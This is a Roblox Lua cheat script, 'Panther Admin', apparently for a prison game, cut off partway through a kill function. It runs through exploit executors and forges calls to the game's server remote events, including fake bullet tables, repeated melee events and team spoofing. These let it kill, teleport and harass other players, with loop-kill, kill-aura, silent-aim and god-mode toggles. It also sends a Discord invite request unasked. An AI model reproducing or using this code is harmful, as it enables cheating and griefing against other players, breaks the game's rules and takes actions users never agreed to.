if not getconnections or not hookmetamethod or not getnamecallmethod or not ((getgenv and getgenv()) or _G) then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Panther Admin",Text = "Executor is not supported!",Duration = 10,})
end
if not workspace:FindFirstChild("Criminals Spawn") or not workspace:FindFirstChild("Criminals Spawn"):FindFirstChild("SpawnLocation") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Panther Admin",Text = "Criminals spawn not found! Please rejoin.",Duration = 10,})
end
game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
if game:FindFirstChild("Panther_update_loaded") then  ((getgenv and getgenv()) or _G).NotifTiger("Panther admin is already executed!",false) return warn("Already loaded") end
local Player, plr,Folder = game:GetService("Players").LocalPlayer, game:GetService("Players").LocalPlayer,Instance.new("Folder",game)
local OldHook, hookmetamethod, getnamecallmethod = nil, hookmetamethod, getnamecallmethod
local HasGamepass,UserInputService = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId, 96651),game:GetService("UserInputService")
local GlobalVar = ((getgenv and getgenv()) or _G)
local Unloaded = false
local CriminalCFRAME = workspace["Criminals Spawn"].SpawnLocation.CFrame
local PremiumActivated = true
print('Panther Admin Loaded')

local Temp = {}
local Kaito = {}
local Reload_Guns = {}
local Prefix = ">"

--------
Folder.Name = "Panther_update_loaded"
ScreenGui = Instance.new("ScreenGui")
CmdBarFrame = Instance.new("Frame")
UICorner = Instance.new("UICorner")
Out = Instance.new("ImageLabel")
UICorner_2 = Instance.new("UICorner")
CommandBar = Instance.new("TextBox")
UIStroke = Instance.new("UIStroke")
Commands = Instance.new("ImageLabel")
UICorner_3 = Instance.new("UICorner")
UIStroke_2 = Instance.new("UIStroke")
CommandsList = Instance.new("ScrollingFrame")
UIListLayout = Instance.new("UIListLayout")
TEMP_CMD = Instance.new("TextLabel")
SearchBar = Instance.new("TextBox")
ScreenGui.Parent = (game:GetService("CoreGui") or gethui())
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Name = tostring(math.random())

CmdBarFrame.Name = "CmdBarFrame"
CmdBarFrame.Parent = ScreenGui
CmdBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
CmdBarFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CmdBarFrame.BackgroundTransparency = 1.000
CmdBarFrame.BorderSizePixel = 0
CmdBarFrame.Position = UDim2.new(0.5, 0, 0.899999998, 0)
CmdBarFrame.Position = CmdBarFrame.Position+UDim2.new(0,0,1.1,0)
CmdBarFrame.Size = UDim2.new(0, 577, 0, 65)

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = CmdBarFrame
Temp.Esps = {}
do
	CmdsIcon = Instance.new("ImageLabel")
	UICornera = Instance.new("UICorner")
	UIStroke12 = Instance.new("UIStroke")
	CmdButton = Instance.new("ImageButton")

	CmdsIcon.Name = "CmdsIcon"
	CmdsIcon.Parent = CmdBarFrame
	CmdsIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	CmdsIcon.Position = UDim2.new(-0.132423401, 0, 0.0226149559, 0)
	CmdsIcon.Size = UDim2.new(0.121672593, 0, 0.945454538, 0)
	CmdsIcon.Image = "rbxassetid://12661800163"
	CmdsIcon.ImageTransparency = 0.030

	UICornera.CornerRadius = UDim.new(0, 6)
	UICornera.Parent = CmdsIcon

	UIStroke12.Parent = CmdsIcon

	CmdButton.Name = "CmdButton"
	CmdButton.Parent = CmdsIcon
	CmdButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdButton.BackgroundTransparency = 1.000
	CmdButton.Position = UDim2.new(0.298999995, 0, 0.27700001, 0)
	CmdButton.Size = UDim2.new(0, 27, 0, 27)
	CmdButton.Image = "rbxassetid://11570802781"
	CmdButton.ImageTransparency = 0.430
	CmdButton.MouseButton1Up:Connect(function()
		if not Temp.CmdsC then
			Temp.CmdsC = true
			if Commands.Visible == false then
				Commands:TweenPosition(SavedCmdsPosition,"Out","Quart",1)
				Commands.Visible = true
			else
				Commands:TweenPosition(SavedCmdsPosition+UDim2.new(0,0,1,0),"Out","Quart",1)
				wait(.5)
				Commands.Visible = false
			end
			wait(.7)
			Temp.CmdsC = false
		end
	end)
	CmdButton.MouseEnter:Connect(function()
		CmdButton.ImageColor3 = Color3.new(0.588235, 0.588235, 0.588235)
	end)
	CmdButton.MouseLeave:Connect(function()
		CmdButton.ImageColor3 = Color3.new(1, 1, 1)
	end)
end
do
	Toggles = Instance.new("ImageLabel")
	local Stokeee = Instance.new("UIStroke")
	local Corrrer = Instance.new("UICorner")
	local ToggleScroll = Instance.new("ScrollingFrame")
	local kewkfwe = Instance.new("UIListLayout")
	local tempb = Instance.new("TextButton")
	local UIStroke = Instance.new("UIStroke")
	local UICorner = Instance.new("UICorner")

	Toggles.Name = "Toggles"
	Toggles.Parent = ScreenGui
	Toggles.AnchorPoint = Vector2.new(0.5, 0.5)
	Toggles.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Toggles.Position = UDim2.new(0.499593854, 0, 0.499376595, 0)+UDim2.new(0,0,1,0)
	Toggles.Size = UDim2.new(0, 539, 0, 409)
	Toggles.Visible = false
	Toggles.Image = "rbxassetid://12011977394"
	Toggles.ImageTransparency = 0.260

	Stokeee.Parent = Toggles
	Stokeee.Name = "Stokeee"

	Corrrer.Name = "Corrrer"
	Corrrer.Parent = Toggles

	ToggleScroll.Name = "ToggleScroll"
	ToggleScroll.Parent = Toggles
	ToggleScroll.Active = true
	ToggleScroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ToggleScroll.BackgroundTransparency = 1.000
	ToggleScroll.Size = UDim2.new(0, 539, 0, 408)
	ToggleScroll.ScrollBarThickness = 4

	kewkfwe.Name = "kewkfwe"
	kewkfwe.Parent = ToggleScroll
	kewkfwe.SortOrder = Enum.SortOrder.LayoutOrder
	kewkfwe.Padding = UDim.new(0, 5)

	tempb.Name = "tempb"
	tempb.Parent = ScreenGui
	tempb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	tempb.BackgroundTransparency = 0.550
	tempb.Position = UDim2.new(0, 0, -7.47979882e-08, 0)
	tempb.Size = UDim2.new(0, 539, 0, 44)
	tempb.Visible = false
	tempb.Font = Enum.Font.SourceSans
	tempb.Text = "Autorespawn [OFF]"
	tempb.TextColor3 = Color3.fromRGB(255, 255, 255)
	tempb.TextSize = 14.000

	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Parent = tempb

	UICorner.CornerRadius = UDim.new(0, 3)
	UICorner.Parent = tempb

end

Out.Name = "Out"
Out.Parent = CmdBarFrame
Out.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Out.Position = UDim2.new(0.0200897697, 0, 0.022615375, 0)
Out.Size = UDim2.new(0.974358976, 0, 0.945454538, 0)
Out.Image = "rbxassetid://11789397066"
Out.ImageTransparency = 0.240

UICorner_2.CornerRadius = UDim.new(0, 6)
UICorner_2.Parent = Out

CommandBar.Name = "CommandBar"
CommandBar.Parent = Out
CommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.BackgroundTransparency = 1.000
CommandBar.BorderSizePixel = 0
CommandBar.Position = UDim2.new(0.0359953903, 0, 0.128254473, 0)
CommandBar.Size = UDim2.new(0, 519, 0, 46)
CommandBar.Font = Enum.Font.SourceSans
CommandBar.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
CommandBar.PlaceholderText = "PANTHER ADMIN"
CommandBar.Text = ""
CommandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.TextSize = 24.000
CommandBar.TextTransparency = 0.140
CommandBar.TextWrapped = true

UIStroke.Parent = Out

Commands.Name = "Commands"
Commands.Parent = ScreenGui
Commands.AnchorPoint = Vector2.new(0.5, 0.5)
Commands.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Commands.Position = UDim2.new(0.5, 0, 0.5, 0)
Commands.Size = UDim2.new(0, 455, 0, 297)
Commands.Image = "rbxassetid://12011977394"
Commands.ImageTransparency = 0.200
Commands.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 6)
UICorner_3.Parent = Commands

UIStroke_2.Parent = Commands

CommandsList.Parent = Commands
CommandsList.Active = true
CommandsList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandsList.BackgroundTransparency = 1.000
CommandsList.Position = UDim2.new(0, 0, 0.077441074, 0)
CommandsList.Size = UDim2.new(0, 455, 0, 274)
CommandsList.ScrollBarThickness = 5
CommandsList.AutomaticCanvasSize="Y"
UIListLayout.Parent = CommandsList
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 8)

TEMP_CMD.Parent = Folder
TEMP_CMD.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TEMP_CMD.BackgroundTransparency = 0.750
TEMP_CMD.Size = UDim2.new(0, 455, 0, 14)
TEMP_CMD.Font = Enum.Font.SourceSans
TEMP_CMD.Text = "sex"--//yes
TEMP_CMD.TextColor3 = Color3.fromRGB(255, 255, 255)
TEMP_CMD.TextSize = 14.000
SavedCmdsPosition = Commands.Position
SearchBar.Parent = Commands
SearchBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SearchBar.BackgroundTransparency = 1.000
SearchBar.Size = UDim2.new(0, 455, 0, 17)
SearchBar.Font = Enum.Font.SourceSans
SearchBar.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
SearchBar.PlaceholderText = "COMMAND SEARCH"
SearchBar.Text = ""
SearchBar.TextColor3 = Color3.fromRGB(234, 234, 234)
SearchBar.TextSize = 14.000

Folder.Parent = game

for i,v in pairs(ScreenGui:GetDescendants()) do v.Name = game:GetService("HttpService"):GenerateGUID(true) end
local AmmountCurrent = 0
local commandsLol = {}
function Kaito:AddCmd(Header, Description, Callback,IsHide,Extra,IsPre,plsdonotlower)
	local CloneTXT = TEMP_CMD:Clone()
	CloneTXT.Text = Prefix..Header.." "..(Extra or "").." | "..Description
	if IsHide then
		CloneTXT.Parent =nil
	else
		CloneTXT.Parent = CommandsList
	end
	if IsPre then
		CloneTXT.TextColor3 = Color3.new(1, 0.796078, 0.0666667)
	end
	AmmountCurrent=AmmountCurrent+1
    commandsLol[Header] = Callback
	local function FactCheck(TheText)
		if Unloaded then return end
		local Text = nil
		if not plsdonotlower then
			Text=TheText:lower()
		else
			Text = TheText
		end
		local Split = Text:split(" ")
		local First = Split[1]
		local Second = Split[2]

		if First:lower() == Header:lower() or First:lower() == Prefix..Header:lower() then
			local a,b = pcall(function()
				Callback(Split)
			end)
			if not a and b then
				warn("--> PANTHER ADMIN DETECTED AN ERROR")
				warn("COMMAND: "..Prefix..Header)
				warn("ERROR: "..tostring(b))
			end
		end
	end
	Player.Chatted:Connect(function(c)
		if c and not Unloaded then
			local Subbed = string.sub(c,1,1)
			if Subbed == Prefix then
				FactCheck(c)
			end
		end
	end)
	CommandBar.FocusLost:Connect(function(EnterKey)
		if EnterKey and not Unloaded then
			FactCheck(CommandBar.Text)
			task.wait(.04)
			CommandBar.Text = ""
		end
	end)
end

function Kaito:Tween(Obj, Prop, New, Time)
	if not Time then
		Time = .5
	end
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(
		Time, 
		Enum.EasingStyle.Quart, 
		Enum.EasingDirection.Out, 
		0, 
		false,
		0
	)
	local propertyTable = {
		[Prop] = New,
	}

	TweenService:Create(Obj, info, propertyTable):Play()
end
function Kaito:Notif(Text,Dur)
	task.spawn(function()
		if not Dur then
			Dur = 1.5
		end
		local Notif = Instance.new("ScreenGui")
		local Frame_1 = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		Notif.Parent = (game:GetService("CoreGui") or gethui())
		Notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		Frame_1.Parent = Notif
		Frame_1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame_1.BackgroundTransparency=1
		Frame_1.BorderSizePixel = 0
		Frame_1.Position = UDim2.new(0, 0, 0.0500000007, 0)
		Frame_1.Size = UDim2.new(1, 0, 0.100000001, 0)
		TextLabel.Parent = Frame_1
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.TextTransparency =1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.Highway
		TextLabel.Text = Text or "Text not found"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 21.000
		Kaito:Tween(Frame_1,"BackgroundTransparency",0.350,.5)
		Kaito:Tween(TextLabel,"TextTransparency",0,.5)
		wait(Dur+.7)
		Kaito:Tween(Frame_1,"BackgroundTransparency",1,.5)
		Kaito:Tween(TextLabel,"TextTransparency",1,.5)
		wait(.7)
		Notif:Destroy()
	end)
	return
end
GlobalVar.NotifTiger = function(t,v)
	Kaito:Notif(t,v)
end
local States = {}
local Settings = {
	Prefix = ">",
	ValidCommands = {},
}
local OrginMenuPos = Player.PlayerGui.Home.hud.MenuButton.Position
local OrginGunPos = Player.PlayerGui.Home.hud.GunFrame.Position
do
	States.loopkillinmates = false
	States.loopkillcriminals = false
	States.DraggableGuis = false
	States.spawnguns = false
	States.loopkillguards = false
	States.Antishield = true
	States.DoorsDestroy = false
	States.antipunch = true
	States.AutoRespawn = false
	States.AutoItems = false
	States.ClickKill = false
	States.ClickArrest = false
	States.AntiTase = true
	States.AntiArrest = true
	States.OnePunch = false
	States.killaura = false
	States.anticrash = false
	States.AntiTouch = false
	States.ShootBack = false
	States.AntiFling = false
	States.AutoInfAmmo = false
	States.joinlogs = true
	States.noclip = false
	States.Godmode = false
	States.loopopendoors = false
	States.SilentAim = false
	States.ArrestAura = false
	States.OneShot = false
	States.ff = false
	States.esp = false
	States.earrape = false
	States.Advertise = false
	--
	Temp.IsBringing = false
	Temp.Loopkilling = {}
	Temp.ArrestOldP = false
	Temp.KillAuras = {}
	Kaito.Whitelisted = {}
	Temp.Admins = {}
	Temp.LoopmKilling = {}
	Temp.Viruses = {}
	Temp.SavedAdmins = {}
	Running = false
end

if writefile and makefolder and readfile and isfile then
	if isfile("Panther Admin") == false or isfile("Panther_Admin/Invite.json") == false then
		makefolder("Panther_Admin")
		if isfile("Panther_Admin/Invite.json") == false then
			writefile("Panther_Admin/Invite.json",game:GetService("HttpService"):JSONEncode({
				Invite_To_Server = true
			}))
		end
		if isfile("Panther_Admin/SavedAdmins.json") == false then
			writefile("Panther_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode({}))
		else
			local Content = game:GetService("HttpService"):JSONDecode(readfile("Panther_Admin/SavedAdmins.json"))
			for i,v in pairs(Content) do
				if v then
					table.insert(Temp.Admins, v)
				end
			end
		end
	end
end

task.spawn(function()
	if writefile and makefolder and readfile and isfile then
		if game:GetService("HttpService"):JSONDecode(readfile("Panther_Admin/Invite.json")).Invite_To_Server then
			local Request_ = (syn and syn.request) or http_request or request
			Request_({
				Url = 'https://discord.com/Roblox',
				Method = 'POST',
				Headers = {
					['Content-Type'] = 'application/json',
					Origin = 'https://discord.com'
				},
				Body = game:GetService("HttpService"):JSONEncode({
					cmd = 'INVITE_BROWSER',
					nonce = game:GetService("HttpService"):GenerateGUID(false),
					args = {code = 'zj5xRp3ZKn'}
				})
			})
		end
	end
end)

function Kaito:CreateBulletTable(Amount, Hit, IsTrue)
	local Args = {}
	for i = 1, tonumber(Amount) do
		if IsTrue then
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(990.272583, 101.489975, 2362.74878), Vector3.new(-799.978333, 0.23157759, -5.88794518)),
				["Distance"] = 198.9905242919922,
				["Cframe"] = CFrame.new(894.362549, 101.288307, 2362.53491, -0.0123058055, 0.00259522465, -0.999920964, 3.63797837e-12, 0.999996722, 0.00259542116, 0.999924302, 3.19387436e-05, -0.0123057645),
			}
		else
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
				["Distance"] = 0,
				["Cframe"] = CFrame.new(),
				["Hit"] = Hit,
			}
		end
	end
	return Args
end
function DragifyGui(Frame,Is)
	coroutine.wrap(function()
		local dragToggle = nil
		local dragSpeed = 0.50
		local dragInput = nil
		local dragStart = nil
		local dragPos = nil
		local startPos = nil
		local function updateInput(input)
			if not Is then
				if not States.DraggableGuis then
					return
				end
			end
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if not Is then
				if States.DraggableGuis then
					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and game:GetService("UserInputService"):GetFocusedTextBox() == nil then
						dragToggle = true
						dragStart = input.Position
						startPos = Frame.Position
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragToggle = false
							end
						end)
					end
				end
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if States.DraggableGuis then
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if States.DraggableGuis then
				if input == dragInput and dragToggle then
					updateInput(input)
				end
			end
		end)
	end)()
end
DragifyGui(Out)
DragifyGui(Commands)
DragifyGui(CmdsIcon)
local IsBringing = false
function Kaito:swait()
	game:GetService("RunService").Stepped:Wait()
end
function Kaito:bring(Target,TeleportTo,MoreTP,DontBreakCar)
	local BringingFromAdmin = nil
	if table.find(Temp.Admins,Target.Name) then
		BringingFromAdmin = true
	end
	if not IsBringing and Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>0 and Target.Character:FindFirstChildOfClass("Humanoid").Sit == false then
		if not TeleportTo then
			TeleportTo = Kaito:GetPosition()
		end
		local Orgin = Kaito:GetPosition()
		local CarPad = workspace.Prison_ITEMS.buttons["Car Spawner"]
		local car = nil
		local Seat = nil
		local Failed = false
		local CheckForBreak = function()
			if not Target or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health<1 or Player.Character:FindFirstChildOfClass("Humanoid").Health<1 then
				Failed = true
				return true
			else
				return nil
			end
		end

		for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
			if v then
				if v:WaitForChild("Body"):WaitForChild("VehicleSeat").Occupant == nil then
					car = v
				end
			end
		end
		if not car then
			coroutine.wrap(function()
				if not car then
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end
			end)()
			repeat wait()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-524, 55, 1777))
				task.spawn(function()
					workspace.Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"])
				end)
				if CheckForBreak() then
					break
				end
			until car
		end
		car:WaitForChild("Body"):WaitForChild("VehicleSeat")
		car.PrimaryPart = car.Body.VehicleSeat
		Seat = car.Body.VehicleSeat
		repeat wait()
			Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
		until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
		wait() --// so it doesnt break
		repeat Kaito:swait()
			if CheckForBreak() or not Player.Character:FindFirstChildOfClass("Humanoid") or Player.Character:FindFirstChildOfClass("Humanoid").Sit == false then
				break
			end
			car.PrimaryPart = car.Body.VehicleSeat
			if Target.Character:FindFirstChildOfClass("Humanoid").MoveDirection.Magnitude >0 then
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-6))
			else
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))
			end
		until Target.Character:FindFirstChildOfClass("Humanoid").Sit == true
		if Failed then
			Kaito:Notif("Failed to bring the player!")
			if BringingFromAdmin then
				local ohString1 = "/w "..Target.Name.." ".."ADMIN: Bring has failed! Try again later."
				local ohString2 = "All"
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
			end
			return
		end
		for i =1,10 do
			car:SetPrimaryPartCFrame(TeleportTo)
			Kaito:swait()
		end
		wait(.1)
		task.spawn(function()
			if PremiumActivated and not DontBreakCar then
				repeat task.wait() until Target.Character:FindFirstChildOfClass("Humanoid").Sit == false
				repeat wait()
					Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
				until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
				for i =1,10 do
					car:SetPrimaryPartCFrame(CFrame.new(0,workspace.FallenPartsDestroyHeight+10,0))
					Kaito:swait()
				end
				Kaito:UnSit()
				Kaito:MoveTo(Orgin)
			end
		end)
		if not PremiumActivated then
			Kaito:UnSit()
			Kaito:MoveTo(Orgin)
		end
	else
		if BringingFromAdmin then
			local ohString1 = "/w "..Target.Name.." ".."Panther: Bring has failed! Try again later."
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

		end
		Kaito:Notif("Player has died or is sitting or an unknown error.")
	end
end

function Kaito:FindPlayer(String,IgnoreError)
	String = String:gsub("%s+", "")
	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Name:lower():match("^" .. String:lower()) or v.DisplayName:lower():match("^" .. String:lower()) then
			return v
		end
	end
	if not IgnoreError then
		Kaito:Notif("Player has left or is not in your current game.",false)
	end
	return nil
end
function Kaito:ConvertPosition(Position)
	if typeof(Position):lower() == "position" then
		return CFrame.new(Position)
	else
		return Position
	end
end

function Kaito:GetPart(Target)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	return Target.Character:FindFirstChild("HumanoidRootPart") or Target.Character:FindFirstChild("Head")
end
function Kaito:GetPosition(Player)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	if Player then
		return Kaito:GetPart(Player).CFrame
	elseif not Player then
		return Kaito:GetPart(plr).CFrame
	end
end
function Kaito:GetCameraPosition(Player)
	return workspace["CurrentCamera"].CFrame
end
function Kaito:Loop(Times, calling)
	for i = 1, tonumber(Times) do
		calling()
	end
end
function PublicOutput(CODE)
	local Args ={
		{
			RayObject = Ray.new(),
			Distance = 0,
			Cframe = CFrame.new(1,1,20000),
			MSG = CODE,
			PLA = Player.UserId
		}
	}
	repeat task.wait() Kaito:GetGun("M9") until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
	local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
	coroutine.wrap(function()
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Args, Gun)
	end)()
	coroutine.wrap(function()
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
	end)()
end
function Kaito:MoveTo(Cframe)
	Cframe = Kaito:ConvertPosition(Cframe)
	local Amount = 5
	if Player.PlayerGui['Home']['hud']['Topbar']['titleBar'].Title.Text:lower() == "lights out" or Player.PlayerGui.Home.hud.Topbar.titleBar.Title.Text:lower() == "lightsout" then
		Amount = 11
	end
	for i = 1, Amount do
		Kaito:UnSit()
		Player.Character:WaitForChild("HumanoidRootPart").CFrame = Cframe
		Kaito:swait()
	end
end
function Kaito:WaitForRespawn(Cframe,NoForce)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	local Cframe = Kaito:ConvertPosition(Cframe)
	local CameraCframe = Kaito:GetCameraPosition()
	coroutine.wrap(function()
		local a
		a = Player.CharacterAdded:Connect(function(NewCharacter)
			pcall(function()
				coroutine.wrap(function()
					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					Kaito:Loop(5, function()
						workspace["CurrentCamera"].CFrame = CameraCframe
					end)
				end)()
				NewCharacter:WaitForChild("HumanoidRootPart")
				Kaito:MoveTo(Cframe)
				if NoForce then
					task.spawn(function()
						NewCharacter:WaitForChild("ForceField"):Destroy()
					end)
				end
			end)
			a:Disconnect()
			Cframe = nil
		end)
		task.spawn(function()
			wait(2)
			if a then
				a:Disconnect()
			end
		end)
	end)()
end
function Kaito:ChangeTeam(TeamPath,NoForce,Pos)
	pcall(function()
		repeat task.wait() until game:GetService("Players").LocalPlayer.Character
		game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

		Kaito:WaitForRespawn(Pos or Kaito:GetPosition(),NoForce)
	end)
	if TeamPath == game.Teams.Criminals then
		task.spawn(function()
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		end)
		repeat Kaito:swait() until Player.Team == game.Teams.Inmates and Player.Character:FindFirstChild("HumanoidRootPart")
		repeat
			Kaito:swait()
			if firetouchinterest then
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 0)
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 1)
			end
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].Transparency = 1
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CanCollide = false
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = Kaito:GetPosition()
		until plr.Team == game:GetService("Teams").Criminals
		game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = CFrame.new(0, 3125, 0)
	else
		if TeamPath == game.Teams.Neutral then
			workspace['Remote']['TeamEvent']:FireServer("Bright orange")
		else
			if not TeamPath or not TeamPath.TeamColor then
				workspace['Remote']['TeamEvent']:FireServer("Bright orange")
			else
				workspace['Remote']['TeamEvent']:FireServer(TeamPath.TeamColor.Name)
			end
		end
	end
end
function Kaito:FindString(String,Table)
	String = String:gsub("%s+", "")
	for m, n in pairs(Table) do
		if n:lower():match("^" .. String:lower()) then
			return n
		end
	end
	return nil
end
function Kaito:Refresh(NoForce,Position)
	Kaito:ChangeTeam(plr.Team,NoForce,Position)
end
function Kaito:UnSit()
	game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
end
function Kaito:KillPlayer(Target,Failed,DoChange)
	local Bullets = Kaito:CreateBulletTable(20,(Target.Character:FindFirstChild("Head") or Target.Character:FindFirstChildOfClass("Part")))
	if not Target or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
		return
	end
	repeat Kaito:swait() until not Target.Character:FindFirstChildOfClass("ForceField")
	local CurrentTeam = nil
	if Target.Team == Player.Team then
		if Target.Team~= game.Teams.Criminals then
			CurrentTeam = Player.Team
			Kaito:ChangeTeam(game.Teams.Criminals,true)
		elseif Target.Team == game.Teams.Criminals then
			CurrentTeam = Player.Team
			Kaito:ChangeTeam(game.Teams.Inmates,true)
		end
	end

	local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
	Kaito:GetGun("Remington 870")
	repeat Kaito:swait()Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
	task.spawn(function()
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
	end)
	coroutine.wrap(function()
		wait(.7)
		pcall(function()
			if Target.Character:FindFirstChildOfClass("Humanoid").Health >1 and not Failed then
				Kaito:KillPlayer(Target,true)
			end
		end)
	end)()
	if CurrentTeam and not Player.Team == CurrentTeam and not DoChange then
		wait(.3)
		Kaito:ChangeTeam(CurrentTeam,true)
	end
end
function Kaito:GetGun(Item, Ignore)
	task.spawn(function()
		workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
			Position = Player.Character.Head.Position,
			Parent = workspace.Prison_ITEMS:FindFirstChild(Item, true)
		})
	end)
end
function Kaito:CreateKillPart()
	if Temp.KillPart then
		pcall(function()
			Temp.KillPart:Destroy()
		end)
		Temp.KillPart = nil
	end
	local Part = Instance.new("Part",plr.Character)
	local hilight = Instance.new("Highlight",Part)
	hilight.FillTransparency = 1

	Part.Anchored = true
	Part.CanCollide = false
	Part.CanTouch = false
	Part.Material = Enum.Material.SmoothPlastic
	Part.Transparency = .98
	Part.Material = Enum.Material.SmoothPlastic
	Part.BrickColor = BrickColor.White()
	Part.Size = Vector3.new(20,2,20)
	Part.Name = "KillAura"
	Temp.KillPart = Part
end
function Kaito:MKILL(target,STOP,P)
	if target == plr or target == plr.Name then
		return
	end
	if typeof(target):lower() == "string" and game:GetService("Players"):FindFirstChild(target) then
		target = game:GetService("Players"):FindFirstChild(target)
	end
	if not STOP then STOP =1 end
	if not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChildOfClass("ForceField") or target.Character:FindFirstChild("Humanoid").Health<1 or not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart")  then
		return
	end
	Kaito:UnSit()
	local saved = Kaito:GetPosition()
	if not P then P = saved else saved = P end
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character:FindFirstChild("Head").CFrame
	wait(.2)
	for i =1,10 do
		task.spawn(function()
			game.ReplicatedStorage["meleeEvent"]:FireServer(target)
		end)
	end
	wait(.1)
	if target and target.Character and target.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("Humanoid").Health >1 and STOP ~=3 then
		Kaito:MKILL(target,STOP+1,P)
		return
	end
